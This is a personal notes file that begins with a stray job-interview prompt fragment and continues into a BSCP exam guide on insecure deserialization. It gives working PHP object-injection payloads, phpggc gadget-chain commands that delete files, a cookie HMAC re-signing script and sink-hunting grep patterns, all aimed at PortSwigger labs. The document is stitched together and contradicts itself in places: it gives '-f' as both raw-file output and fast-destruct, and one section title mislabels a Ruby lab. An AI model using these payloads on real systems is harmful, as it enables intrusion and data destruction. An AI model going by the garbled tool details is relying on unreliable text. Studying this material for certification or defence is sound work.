---
created: 2026-05-20
tags:
status: slop
---
implementing IAM policies, secrets management (Vault, AWS KMS), container/image scanning (Trivy, Clair, Snyk), WAF rules, infrastructure as code security (Checkov, tfsec), compliance (SOC2, ISO27001), incident response, or blue/green/canary deployments with security gates.
repository security policies (GitHub)

- i can apply to roles that require more than i have now, because i have around 2 years or research and practice, and overall i am very capable of learning. so, i will apply to something now, indicate more in my CV, and then prepare to interviews based on topics. i will not lie - but i know what i can defend, for sure.

give me please a comprehensive list of topics i should research for an interview like that
# Insecure Deserialization — BSCP Practitioner Guide

A standalone reference for the BSCP exam and PortSwigger Web Security Academy Practitioner labs. Written by a practitioner for other hackers — focused on internal mechanisms, why attacks work, and the practical workflow you execute in Burp.

---

## 1. Foundations

### 1.1 Serialization and deserialization

> **Serialization** is the process of converting an in-memory data structure or object into a linear byte stream or structured text representation that can be persisted (disk, database) or transmitted (network) and later reconstructed in the same — or a different — runtime environment.

> **Deserialization** is the inverse process: parsing a serialized byte stream and reconstructing the original object graph, including class identities, field values, and any behavioral metadata that was preserved during serialization.

Serialization is what lets an application freeze the state of a complex object — a `User`, a `ShoppingCart`, a `Session` — and resurrect it later with the same fields, references, and class membership. Without it, every cross-process boundary (HTTP request, RPC call, cache write, queue message) would have to be hand-marshalled into primitive types. With it, developers can pass entire object graphs across the wire as a single blob.

The mechanism is also the attack surface. The same machinery that reconstructs a benign `User` will, given malicious input, reconstruct any class the runtime can resolve — and execute the lifecycle callbacks that class defines.

> [!note]
> Deserialization is also called **unmarshalling**, **decoding**, or **unpickling** (Python). In PHP it is `unserialize()`; in Java it is `ObjectInputStream.readObject()`; in .NET it is `BinaryFormatter.Deserialize()`; in Python it is `pickle.loads()`.

### 1.2 Serialization format taxonomy

Three categories matter for BSCP:

| Category | Encodes class info | Invokes lifecycle methods | Examples |
|----------|--------------------|---------------------------|----------|
| **Text-based, schemaless** | No (unless extended) | No | JSON, XML, YAML, CSV |
| **Native binary** | Yes | Yes | Java `ObjectOutputStream`, .NET `BinaryFormatter`, Python pickle |
| **Native text/hybrid** | Yes | Yes | PHP `serialize()`, Ruby `Marshal` (binary), `phpserialize` |

Formats in the second and third row are the dangerous ones, because the byte stream itself names classes the runtime must instantiate and methods the runtime must invoke. JSON and XML, by contrast, ship only data — they are unsafe only when a wrapper layer such as `JsonConvert.DeserializeObject` with `TypeNameHandling.All`, Jackson polymorphic typing, or `SnakeYAML` Java tags reintroduces class binding on top.

### 1.3 Insecure deserialization

> **Insecure deserialization** is a vulnerability that arises when an application deserializes data that an attacker can influence, without first validating or restricting the type of object that may be reconstructed, allowing the attacker to manipulate the state, class identity, or behavioral callbacks of the resulting object graph.

> **Object injection** is the specific class of insecure deserialization in which the attacker substitutes the serialized payload with an object of a class different from the one the application expected, in order to invoke that foreign class's lifecycle methods.

The vulnerability is *not* about deserialization producing the wrong data. It is about deserialization producing a *fully constructed live object* whose constructors, finalizers, and serialization callbacks have already executed by the time the application gets to inspect the result. Validation that runs after `unserialize()` returns is, in most exploitable cases, already too late.

### 1.4 Why deserialization itself is the attack

When the runtime parses a serialized object it does far more than copy bytes into fields. The Java sequence is illustrative:

1. `ObjectInputStream.readObject()` receives attacker-controlled bytes.
2. The JVM reads class descriptors from the stream and loads each class via its `ClassLoader`. Static initializers (`<clinit>`) fire.
3. Memory is allocated and an instance is created **without** the public constructor running (the JVM uses a special path).
4. If the class defines a private `readObject(ObjectInputStream)` method, it is invoked. This method has full access to the stream and can do anything Java permits.
5. If `readResolve()` is defined, it runs after `readObject()` and may substitute a different object.
6. If the deserialized object is inserted into a hash-based collection encoded in the same stream, the collection calls `hashCode()` and `equals()` on it. Both methods can be attacker-influenced if the class overrides them.
7. Only now does control return to the application.

PHP follows the same pattern with different hooks: `__unserialize()` (PHP 7.4+) or `__wakeup()` runs the instant `unserialize()` reconstructs the object, and `__destruct()` runs at the end of the script regardless of how it terminates — including when a thrown exception aborts the request.

> [!important]
> The majority of deserialization exploits complete their work **before** `unserialize()`/`readObject()` returns. The application never sees the malicious object as a usable value; the damage is done by the lifecycle hooks the runtime invoked during reconstruction.

### 1.4.1 Walkthrough of a PHP deserialization in slow motion

Consider this minimal vulnerable code:

```php
class Session {
    public $username;
    public $isAdmin;

    public function __wakeup() {
        $this->loadProfile();
    }

    private function loadProfile() {
        include "/var/profiles/" . $this->username . ".php";
    }
}

$cookie = base64_decode($_COOKIE['session']);
$session = unserialize($cookie);
if (!$session->isAdmin) {
    http_response_code(403);
    die("Not an admin");
}
```

When the request arrives, the chain of events is:

1. The cookie is base64-decoded and handed to `unserialize()`.
2. `unserialize()` allocates a `Session` object without invoking `__construct()`.
3. Each property the attacker shipped in the stream is assigned, in order.
4. The runtime checks for `__unserialize()` (absent) and falls back to `__wakeup()` (present). `__wakeup()` is invoked.
5. `__wakeup()` calls `loadProfile()`, which concatenates `$this->username` into an `include` path.
6. If the attacker set `$username = "../../../../tmp/payload"`, the runtime includes attacker-controlled PHP from `/tmp/payload.php`.
7. Only now does `unserialize()` return. The application's `$session->isAdmin` check executes — but the attacker has already achieved code execution five steps ago.

This is what *"the damage is done before deserialization is finished"* means in practice. There is no place to insert a check that runs earlier than `__wakeup()` because `__wakeup()` runs inside `unserialize()` itself.

### 1.5 Root causes

- **Validation comes too late.** Type checks and field whitelists placed after deserialization run after constructors and callbacks have already executed.
- **Class universe is enormous.** A typical web stack imports tens to hundreds of libraries. Every class with a `Serializable` marker or a magic method is a potential gadget. Developers cannot audit the transitive set.
- **Implicit trust.** Deserialized data is treated as if it came from the application itself. Session cookies, view-state blobs, and cached objects are rarely re-validated.
- **Format ambiguity.** Native serializers will reconstruct *any* class — not just the one expected — when its name appears in the stream.

> [!note]
> Ideally, user-controllable data should never be deserialized with a native serializer. If you must accept structured data from the client, use a schemaless format (JSON, plain text) and reconstruct trusted types manually on the server.

---

## 2. Identifying insecure deserialization

Before exploitation comes recognition. In a BSCP-style engagement you will not be told "this cookie is a serialized object" — you will be handed a black-box application and must spot the format yourself.

### 2.1 Where serialized data hides

- **Session cookies** — by far the most common BSCP placement. PortSwigger Practitioner labs almost always put the vulnerable blob in the `session` cookie.
- **Hidden form fields** and CSRF tokens.
- **`Authorization: Bearer` headers** that aren't JWTs (no triple-segment structure, no `eyJ`).
- **Query and POST parameters** containing Base64 or URL-encoded blobs that don't look like JSON, XML, or JWT.
- **Java `ViewState`** in legacy JSF/Spring apps.
- **`__VIEWSTATE`** in ASP.NET (`BinaryFormatter` or `LosFormatter`).
- **Cached objects** in Redis/Memcached if the application exposes any vector that writes attacker data into the cache.

### 2.2 Format fingerprints

| Format | Raw signature | Base64 signature | Other hints |
|--------|---------------|-------------------|-------------|
| PHP `serialize()` | `O:` `a:` `s:` `i:` `b:` `N;` | `Tzo` (for `O:`), `YTo` (for `a:`) | Often raw-readable; `Content-Type` rarely set |
| Java `ObjectOutputStream` | `\xAC\xED\x00\x05` | `rO0AB` | `Content-Type: application/x-java-serialized-object`; gzip wrapper starts `H4sI` (`H4sIAAAAAAAAA` in Base64) |
| .NET `BinaryFormatter` | `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` | `AAEAAAD/////` | Often inside `__VIEWSTATE` (also LosFormatter) |
| Python pickle (proto 2+) | `\x80\x04` / `\x80\x05` | `gASV` / `gAUV` | Rare in web apps but seen in ML/data tools |
| Ruby Marshal | `\x04\x08` | `BAh` | Rails session cookies before encryption rollout |
| YAML | `---` or `!!python/object` tags | — | Configuration intake, file uploads |

> [!tip]
> In Burp, highlight the suspect value and watch the **Inspector** pane. Burp auto-decodes Base64 and recognizes PHP serialized format. If the decoded text begins with `O:` followed by a number, you have PHP. If you see `\xAC\xED` or the Base64 prefix `rO0`, you have Java.

### 2.3 Peeling encoding layers

Serialized blobs rarely sit raw in a cookie. The wrapper order is usually:

```
URL-encode( Base64( [optional gzip(] raw-serialized-bytes [)] ) )
```

Work outward in:

1. URL-decode first. `%3D` → `=`, `%2B` → `+`, `%2F` → `/`.
2. Base64-decode. If you see binary noise starting with `\x1F\x8B`, it's gzip — pipe through `gunzip`.
3. Inspect the leading bytes against the fingerprint table above.

CyberChef recipes — *URL Decode → From Base64 → Gunzip → PHP Deserialize* — make this trivial.

---

## 3. Methodology

A repeatable BSCP workflow for every deserialization target:

1. **Capture and decode.** Identify the candidate blob, peel encodings, dump the plaintext serialized form.
2. **Fingerprint the format.** PHP, Java, .NET, Python, Ruby, YAML — each has different exploitation primitives.
3. **Parse the structure.** Note the class name, every property, every type tag, every length prefix.
4. **Map fields to behavior.** Look at the application: what does it do with each attribute? Which field controls authorization, file paths, or string interpolation?
5. **Choose an attack class** based on what you control and what you can see:
   - **(A) Attribute tampering** — flip a boolean (`admin`), change a username, raise a balance. Use when an attribute clearly maps to a privilege or identity decision. *Lab 1.*
   - **(B) Type confusion** — swap a string for an integer or null to abuse loose comparison or skip validation. Use when an attribute is compared with `==` or passed into a typed sink. *Lab 2.*
   - **(C) Functional sink abuse** — repoint a path/URL/identifier the application uses for an operation (delete, include, fetch). Use when an attribute clearly feeds into a filesystem or network call. *Lab 3.*
   - **(D) Arbitrary object injection (manual)** — supply an object of a different class that has a useful magic method. Use when you have source code access and can identify a gadget class in the application. *Lab 4.*
   - **(E) Library gadget chain** — use prebuilt POP chains in PHP via `phpggc`, or Java chains via `ysoserial`, to reach RCE through framework classes. Use when source is opaque but you know the framework. *Labs 5–7.*
6. **Build the payload.** Recompute every length prefix you touch.
7. **Re-wrap encodings** in the same order as decode, reverse.
8. **Replay and observe.** Watch for `200`s, error stack traces (which leak class names — invaluable), or out-of-band callbacks.

> [!note]
> Errors are not failures — they are intelligence. A PHP fatal error showing `__PHP_Incomplete_Class_Name` tells you a class is missing. A Java `ClassNotFoundException` tells you which class the application expected. Treat every stack trace as a class-disclosure primitive.

---

### 3.1 A note on signed and encrypted blobs

Most modern frameworks place a MAC over their session payload. Symfony signs with a server-side secret; Laravel `app.key` AES-encrypts; Rails 5+ encrypts with AES-GCM; ASP.NET MAC-signs `__VIEWSTATE` with `<machineKey>`. If you can read the cookie's plaintext, you are in scope; if you cannot, you need either:

- A leaked key (look for source archives, `.env` files, GitHub commits, framework debug pages, `phpinfo()` dumps).
- A second vulnerability that exposes the key (LFI reading the framework config, SSRF to the internal admin).
- A separate cryptographic flaw in the verification — `alg: none` in JWT-style schemes, padding oracles in old ASP.NET, weak truncated HMAC.

BSCP labs occasionally hand you the secret directly (as a leaked config value or via a separate-but-linked vulnerability). When they do, sign your tampered payload yourself before sending it.

## 4. Attack class A — Manipulating object attributes

The simplest, most reliable, and exam-most-common variant. You leave the class intact and edit one or more attribute values inside the serialized stream.

### 4.1 The PHP serialization grammar

PHP's native format is human-readable text with type tags and explicit lengths. Every value follows one of two shapes:

```
<type>:<length>:<value>;
<type>:<value>;
```

| Tag | Type | Example |
|-----|------|---------|
| `s` | String | `s:5:"alice";` |
| `i` | Integer | `i:42;` |
| `d` | Float (double) | `d:3.14;` |
| `b` | Boolean | `b:1;` (true) / `b:0;` (false) |
| `N` | Null | `N;` |
| `a` | Array | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| `O` | Object | `O:4:"User":2:{...}` |
| `C` | Custom-serialized object (Serializable interface) | `C:11:"SomeClass":5:{...}` |
| `R` | Reference (by index) | `R:1;` |

A `User` object with `username=wiener` and `admin=false` serializes to:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Read it left-to-right:

- `O:4:"User":2:` — an Object whose class name is 4 characters long (`User`) with 2 declared properties.
- `s:8:"username";` — property key, a string of length 8.
- `s:6:"wiener";` — property value, a string of length 6.
- `s:5:"admin";` — second property key.
- `b:0;` — second value, a boolean (`0` = false).

> [!warning]
> Every time you change a string value or property name you **must** update the integer length prefix that precedes it. PHP's parser uses the prefix to know how many bytes to consume; a mismatch throws a parse error and the entire object fails to deserialize.

### 4.2 Worked example — privilege escalation by attribute flip

This mirrors *Lab: Modifying serialized objects* (Apprentice tier but foundational).

The application issues a Base64-encoded session cookie. Decoded, it reads:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

The `admin` property gates access to `/admin`. Flip the boolean:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

Re-encode to Base64, place back in the `session` cookie, replay. The `/admin` page now renders, including the *Delete user* control. Submit a delete for `carlos`.

> [!tip]
> Use **Burp Inspector** to do all of this without leaving the request editor. Highlight the cookie value; the `Base64` and `PHP Serialized Object` views are stacked, and edits in the parsed view are written back through both encodings on `Apply`. This is the single most useful Burp feature for these labs.

### 4.3 Why the server accepts it

The cookie has no integrity protection — no HMAC, no signature, no encryption with an unknown key. The application is using serialization as a session format but storing the session client-side. Once the bytes are user-controlled the boolean is user-controlled, and the post-deserialization access check happily reads `$user->admin === true`.

---

## 5. Attack class B — Modifying data types

If the application compares deserialized attributes with PHP's loose-equality operator `==`, the type tag in the serialized stream is a primitive you control.

### 5.1 PHP loose comparison primer

PHP's `==` performs type coercion before comparing. The rules most useful to an attacker:

- `5 == "5"` → `true` (string coerced to int).
- `5 == "5abc"` → `true` on PHP 7 and PHP 8 alike (leading-numeric strings coerce to their integer prefix).
- `0 == "abc"` → `true` on **PHP 7.x and earlier** (any non-numeric string coerces to `0`).
- `0 == "abc"` → `false` on **PHP 8+** (this footgun was finally fixed).
- `0 == null` → `true`.
- `"" == null` → `true`.

The classic exploit: if a stored access token is `"rp0ryjfyrnqwglqsurta30gittccaxbr"` and the application checks `$tokens[$user->username] == $user->access_token`, replacing the attacker's `access_token` with the **integer** `0` will, on PHP 7, coerce the stored string to `0` and the comparison evaluates true.

### 5.2 Worked example — authentication bypass via type confusion

This mirrors *Lab: Modifying serialized data types*.

Decoded session for `wiener`:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"rp0ryjfyrnqwglqsurta30gittccaxbr";}
```

A plain username swap (`wiener` → `administrator`) returns `500` with a verbose stack trace — the application looks up the token for `administrator`, doesn't find a match for `wiener`'s token, and throws. But the trace reveals the comparison is `$access_tokens[$user->username] == $user->access_token`.

Switch `access_token` from a string to an integer `0`:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Note three things you must keep in sync:

- The username's length prefix changed from `6` to `13`.
- The `access_token` tag changed from `s:32:"..."` to `i:0;` — the length prefix and the quotes are gone because integers have no length.
- The property count `O:4:"User":2:` did not change — there are still two properties.

Re-encode, replay, the app responds `200`, you reach `/admin` as the administrator, delete `carlos`.

> [!important]
> Be ruthless about length-prefix arithmetic. A serialized payload that fails to parse will deserialize to `false` in PHP, and the application's null-check (if any) will silently drop you back to anonymous. Always count bytes after editing.

### 5.3 Other type-confusion tricks

- **String → array**: passing `a:0:{}` where a string is expected can cause `strcmp()` to return `null` (treated as zero in `==`). PHP raises a warning but doesn't halt.
- **String → null** (`N;`): often bypasses `isset()` and `empty()` checks if the deserialized object is used as configuration.
- **Bool → int**: `b:1;` and `i:1;` are not the same — `===` comparisons can be defeated by picking the right one.

---

## 6. Attack class C — Abusing application functionality

The application doesn't always need to compare a deserialized attribute for the attack to land — sometimes it just *uses* the attribute, and the use itself is the sink. The classic example is a file path stored in the session.

### 6.1 Worked example — arbitrary file delete via avatar path

This mirrors *Lab: Using application functionality to exploit insecure deserialization*.

The application provides two accounts: `wiener:peter` (low-privilege, the one you keep) and `gregg:rosebud` (low-privilege, used as a recon donor). Logging in as `gregg` and triggering the *Delete account* flow shows that deletion both unlinks the avatar from disk and removes the user record. The session cookie carries:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"...";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

The `avatar_link` attribute is the file path passed to `unlink()` during account deletion. There is no validation that the path stays within the avatars directory.

Switch to `wiener`'s session cookie, then rewrite the avatar:

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Replay against the delete-account endpoint. Note that you must use `wiener`'s session for the request to authenticate, but the rewritten `avatar_link` points outside the avatars tree to `/home/carlos/morale.txt`. The application authenticates as `wiener`, runs the cleanup routine, calls `unlink("/home/carlos/morale.txt")`, and the lab is solved.

### 6.2 Other functional sinks to look for

- **Image renderers** — `getimagesize()`, `file_get_contents()` reading a path from the object.
- **Template loaders** — `include $this->template_path`.
- **Log writers** — `file_put_contents($this->log_file, ...)`.
- **External fetchers** — `curl_exec()` taking a URL field; ideal for SSRF.
- **Command builders** — methods that splice an attribute into a shell call.

The pattern is identical: any attribute that influences a privileged operation, even without a comparison, is a target.

---

## 7. PHP magic methods

To reach RCE in PHP you usually have to make the deserialization process itself execute attacker-influenced code. Magic methods are the lever.

> **Magic methods** are class methods named with a leading double underscore (`__`) that the PHP runtime invokes implicitly in response to specific events on an object — instantiation, destruction, string conversion, missing-property access, deserialization, and others — without an explicit call from application code.

The reason they matter is exactly this: the application never wrote `$obj->__wakeup()`, but as soon as `unserialize()` reconstructs an object whose class defines `__wakeup()`, PHP calls it. You inject the object; PHP invokes the gadget.

### 7.1 Exploitability ranking

| Method | Trigger | Practical exploitability |
|--------|---------|--------------------------|
| `__wakeup()` | Immediately after `unserialize()` reconstructs an object (PHP < 7.4 always; PHP 7.4+ only if no `__unserialize()` exists) | **High** — entry point for most chains |
| `__unserialize(array)` | `unserialize()`, PHP 7.4+ | **High** — supersedes `__wakeup()` when present |
| `__destruct()` | Object is destroyed (script end, `unset()`, exception unwind) | **High** — fires even on parse errors; great fallback |
| `__toString()` | Object used in string context (`echo`, string concat, `strpos`, `sprintf`, etc.) | **Medium/high** — perfect chain hop |
| `__call(name, args)` | Calling a non-existent / inaccessible instance method | Medium — useful in proxy patterns |
| `__get(name)` | Reading a missing or inaccessible property | Medium — gadget glue |
| `__invoke()` | Object used as a function: `$obj($arg)` | Medium — common in callable-passing code |
| `__set()` | Writing a missing property | Low |
| `__construct()` | `new` and certain deserialization paths | Low — not invoked by `unserialize` in normal PHP |
| `__sleep()` / `__serialize()` | During `serialize()` only | Not exploitable from unserialize |

### 7.2 `__wakeup()` and `__destruct()` — the workhorses

`__wakeup()` was intended as a place for an object to re-establish runtime state (reopen a database connection, reattach a logger) after being thawed from a serialized form. If an application uses `__wakeup()` to call any method that takes attacker-controlled properties, you have RCE-grade primitive at the moment of deserialization.

`__destruct()` is the most reliable trigger of all. It fires when the object's refcount drops to zero, which for a session object is typically at script termination. It fires whether the script ended cleanly, threw an exception, or `die()`d. Even if the application throws a type error after deserialization, `__destruct()` already ran the gadget.

> [!important]
> A common defensive pattern is to call `unserialize($data)` inside a `try { }` and treat any thrown exception as a rejection. This does **not** stop the attack if your gadget chain reaches its sink via `__destruct()` — the destructor fires during garbage collection, after the `catch` block, on the way out of the request.

### 7.3 `__toString()` — the chain pivot

`__toString()` is invoked anywhere an object is coerced to a string. It is the most common pivot in multi-step PHP chains because *anything* the runtime stringifies — a log message, a concat, an `echo`, an exception's message — will fire it. Build chains by finding a `__wakeup()` or `__destruct()` that uses one of its object properties in a string context and another class whose `__toString()` does something dangerous (`include`, `eval`, `call_user_func`, etc.).

### 7.4 Finding gadget classes in source

When you have source access (Lab 4 explicitly grants it via a code archive):

```bash
# every class that defines an explicitly exploitable magic method
grep -RIn --include='*.php' -E 'function\s+__(wakeup|destruct|toString|invoke|call|get)\b'

# any class with a dangerous sink
grep -RIn --include='*.php' -E '\b(eval|system|exec|passthru|shell_exec|popen|proc_open|assert|create_function|include|include_once|require|require_once|unlink|file_put_contents|file_get_contents|fopen|call_user_func|call_user_func_array)\s*\('

# intersect: classes that do both
```

Read the destructors and wakeups. You are looking for a class whose magic method touches an attribute the attacker controls and feeds it into one of the sinks above. That class is your gadget.

---

## 8. Attack class D — Arbitrary PHP object injection (manual)

When the application doesn't directly do anything dangerous with the session object's attributes, but a different class in the codebase has a magic method that does, you can swap the object's class to that other class. PHP doesn't care that the application expected `User`; it will deserialize whatever class name you write.

### 8.1 Worked example — `CustomTemplate` RCE

This mirrors *Lab: Arbitrary object injection in PHP*.

The application stores `User` objects in the session cookie, and the session class itself is unremarkable. The shipped source archive includes a `CustomTemplate` class along the lines of:

```php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . '.lock';
    }

    public function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```

The destructor calls `unlink()` on an attribute. The attacker controls the attribute the moment they craft a serialized `CustomTemplate`.

The payload PHP needs to deserialize:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

A clean way to generate this is to run a one-off PHP script locally (any sandbox, even an online runner) with the same class definition and `echo serialize(new CustomTemplate(...))`. URL-encode the Base64 (because `+`, `/`, and `=` collide with URL syntax) and drop the result into the `session` cookie.

> [!warning]
> Only one property (`lock_file_path`) is shown, and the object count is `1`, not `2`. The constructor sets `template_file_path` too, but PHP's `unserialize()` does **not** call constructors — it sets only the properties you list. You can ship a single property and the runtime will be fine. Declaring `2` properties while supplying one would cause a parse failure.

### 8.2 Common pitfalls

- **Private/protected property name mangling.** A private `$foo` of class `Bar` serializes as `\x00Bar\x00foo` (null bytes around the class name). A protected `$foo` serializes as `\x00*\x00foo`. When you compute the length prefix, count the null bytes — `\x00Bar\x00foo` is 8 characters, not 6. The cleanest workaround is to make the property `public` in your local class while generating the payload, but to test once with the mangled form if `public` produces nothing useful.
- **Base64 alphabet collisions.** `=` is the Base64 padding character and also a URL parameter separator; `+` decodes to space in `application/x-www-form-urlencoded`; `/` is valid in a cookie but not in a path. Always URL-encode the Base64 string when it travels in a URL or a body.
- **Property visibility mismatch.** If the lab's class declares `protected $logFile` and you serialize as if it were `public`, PHP creates the property with public visibility on the deserialized object. The magic method, defined on the original class, may read `$this->logFile` and get null. Match visibility.

---

### 8.3 Hand-rolling the payload locally

When you have the source archive, the cleanest way to build a payload is to copy the gadget class verbatim into a one-off PHP script and let the runtime do the serialization for you. No length-prefix arithmetic, no null-byte miscounts:

```php
<?php
class CustomTemplate {
    public $template_file_path;
    public $lock_file_path;
}

$obj = new CustomTemplate();
$obj->lock_file_path = '/home/carlos/morale.txt';
echo base64_encode(serialize($obj));
```

Run with `php payload.php`. The output is ready to drop into the cookie. The reason this works even when the original class had `private` or `protected` properties is that you redefine the class as `public` in your stub; PHP serializes with the visibility *of the class you currently have loaded*, not the one on the server. When the server deserializes, it reattaches the property to the server-side class definition. In most cases this is fine; if the server's gadget reads `$this->prop` from a method defined on the original class, the property lookup works because PHP resolves properties dynamically by name.

> [!warning]
> The only case where redefining visibility breaks the payload is when the original class declares the property `private` and the gadget code accesses it via `Reflection` or via a method *on the original class* that captures the mangled name. In those cases, ship the property with the original null-byte-mangled name: `\x00CustomTemplate\x00lock_file_path`. In a serialized string that becomes `s:30:"\x00CustomTemplate\x00lock_file_path"` — count 30 bytes, including the two null bytes.

### 8.4 Combining injection with magic-method side effects

Object injection is not limited to `__destruct()`. Any class whose `__wakeup()`, `__toString()`, `__call()`, or `__invoke()` reaches a sink is a viable target. Common patterns to hunt for in source review:

- A `__wakeup()` that calls `$this->method()` where `$this->method` is set from a property — pairs nicely with another class whose `__call()` invokes a callable property on its parameters.
- A `__toString()` that performs `return file_get_contents($this->path)` — read primitive.
- An `__invoke()` that wraps `eval()`, `assert()`, `create_function()`, or `call_user_func()` on an attribute.
- Any method called by a destructor that takes the destructor's properties and feeds them into the database, the filesystem, or the network.

The hunt is purely mechanical: enumerate every magic method in the codebase, read each, and ask whether you control the data it touches.

## 9. PHP gadget chains and `phpggc`

When source review is impractical and the codebase is a known framework — Symfony, Laravel, Monolog, Doctrine, Guzzle, Yii — the heavy lifting has already been done by others. **PHPGGC** is the PHP equivalent of `ysoserial`.

> **A gadget** is a method (often a magic method) belonging to an existing class whose behavior is dangerous when its parameters are attacker-controlled. **A gadget chain** is an ordered sequence of gadgets in which the trigger of one passes control to the next, ultimately reaching a sink that achieves the attacker's goal (RCE, file write, SSRF, deserialization-amplifier).

Chains in PHP are also called **POP chains** (Property-Oriented Programming) by analogy with ROP — you assemble computation out of pre-existing methods by chaining their side effects, rather than writing new code.

### 9.1 Installing and listing

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
./phpggc -l
```

`-l` prints every chain bundled with PHPGGC. Each row shows the framework, the version range, the chain type (RCE, File Write, Include, etc.), and the entrypoint magic method. For BSCP-relevant labs you will most often see chains like `Symfony/RCE1`, `Symfony/RCE4`, `Laravel/RCE1` ... `Laravel/RCE9`, and `Monolog/RCE1` through `RCE8`.

### 9.2 Generating a payload

The basic shape:

```bash
./phpggc <chain> <args>
```

For a Symfony1 RCE chain calling `system` with a chosen command:

```bash
./phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```

PHPGGC prints the raw serialized object to stdout.

Wrapping flags you will need repeatedly:

- `-b` — Base64-encode the output. Use when the sink expects Base64 (cookies usually do).
- `-u` — URL-encode the output. Stack with `-b` when the payload also needs to ride in a URL or a body.
- `-s` — soft-quote / shell-escape the command argument so quoting doesn't break inside the chain.
- `-f` — output as a raw file (`-o out.bin`).
- `-a` — use ASCII-only payloads (helps when the cookie path strips non-ASCII).
- `-fast-destruct` / `-fd` — append garbage after the object so deserialization fails partway, but PHP still invokes `__destruct()` on the partially constructed object. Critical for length-check bypass (next section).

Putting it together for a typical BSCP cookie:

```bash
./phpggc -b Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```

The output is a single Base64 string ready to paste into `Cookie: session=...`.

### 9.3 Worked example — Symfony/Monolog RCE through a session cookie

This mirrors *Lab: Exploiting PHP deserialization with a pre-built gadget chain*.

1. Log in as `wiener:peter`, capture the session cookie, send it to Repeater.
2. Base64-decode the cookie. You see a normal `User` object with a `username`, an `access_token`, and an `avatar_link` — nothing immediately interesting.
3. The lab page tells you the application uses the **Symfony 4.1.6** framework (the version disclosed via a `cookie_secret` HTTP header or comment depending on the lab variant).
4. Generate a Symfony RCE chain:
   ```bash
   ./phpggc -b Symfony/RCE4 exec 'rm /home/carlos/morale.txt'
   ```
5. Paste the Base64 string into the `session` cookie value. Send.
6. Even if the application returns `500`, the `__destruct()` on the chain's terminal gadget fires during request teardown and runs the command.

### 9.4 Why the chain works

Symfony's `FormattableHeader`/`Bag` classes — exact names depending on chain — have `__toString()` and `__destruct()` methods that resolve callables out of attributes. PHPGGC constructs an object graph in which the topmost `__destruct()` accesses a property that is itself an object with a `__toString()` defined to invoke `call_user_func()` on yet another property, which holds the attacker's command. You do not need to know the internal class topology to exploit it — you do need to know which framework version the chain targets, because chains break between minor versions.

---

## 10. Bypassing length-prefix defenses — fast destruct

Some applications attempt to defend against deserialization tampering with a check like:

```php
if ($cookie === $signed) {
    $obj = unserialize($cookie);
}
```

or, more interestingly:

```php
if (strlen($cookie) > MAX_SESSION_LEN) {
    throw new Exception('Session too large');
}
$obj = unserialize($cookie);
```

The second pattern blocks bulky gadget chains. But there is a subtler obstacle: some applications validate the *structure* of the deserialized object after the fact, rejecting any session that does not parse to the expected `User` shape. The reject path typically `dies` before any further code runs.

This is where the `__destruct()` quirk comes in. PHP's `unserialize()`, on encountering trailing garbage after an otherwise-valid object, raises a notice and returns `false` — but the object it had already constructed is still in memory long enough for its destructor to run during garbage collection. By appending unparseable data to a valid serialized payload, you:

1. Force `unserialize()` to return `false`, which skips the application's post-deserialization handling.
2. Still get the gadget's `__destruct()` to fire when PHP cleans up the partially-built object.

PHPGGC automates this with `--fast-destruct`:

```bash
./phpggc -b -f Symfony/RCE4 system 'rm /home/carlos/morale.txt'
# -f is the short form of --fast-destruct
```

> [!important]
> Use fast-destruct whenever the application appears to validate the deserialized object's class or fields and rejects anything that isn't the expected `User`. The technique lets your gadget fire *before* the validation path sees the result.

### 10.1 Worked example — bypassing a length-prefix integrity check

This mirrors *Lab: Exploiting Ruby deserialization using a documented gadget chain* in Burp Academy spirit when applied to a hardened PHP target — or, in the Practitioner set, the lab that wraps the session in an HMAC.

If the cookie is `<base64-payload>.<hex-hmac>` and you have a leaked secret (e.g. via a developer comment, source archive, or a separate vulnerability), compute the HMAC yourself:

```bash
python3 -c "
import hmac, hashlib, base64
secret = b'leaked-secret-string'
payload = base64.b64decode('<your-phpggc-output>')
sig = hmac.new(secret, payload, hashlib.sha1).hexdigest()
print(base64.b64encode(payload).decode() + '.' + sig)
"
```

Drop the resulting `payload.sig` into the cookie. The integrity check passes; the deserialization runs the gadget.

---

### 10.2 Why fast-destruct works at the parser level

Internally, PHP's `unserialize()` is a recursive-descent parser that allocates objects as it goes. When it encounters malformed input — a length prefix that doesn't match, an unexpected character, an unmatched brace — it raises `E_NOTICE`, returns `false`, and abandons the parse. But the objects it had already constructed are now garbage. PHP's reference-counted GC notices their refcount is zero and frees them. Freeing a PHP object invokes `__destruct()`. Hence, "fast destruct" — destruction is forced *fast*, before any further application code runs.

The trick was popularized by Ambionics (the authors of PHPGGC) and is the reason `phpggc --fast-destruct` exists as a flag. The implementation is trivial: append a single semicolon-and-junk pattern after the serialized object so the parser errors out at the byte after the last legitimate value. Hand-rolling looks like:

```
O:11:"SomeGadget":1:{s:4:"path";s:23:"/home/carlos/morale.txt";}}
```

The trailing `}}` (one extra close-brace) is enough to break the parser. The gadget object is fully constructed by the time the second `}` is read; the destructor fires during the abort.

## 11. Java native serialization

Java is the highest-impact format on BSCP because gadget chains in Java tend to lead straight to RCE without any source review.

### 11.1 Wire format and recognition

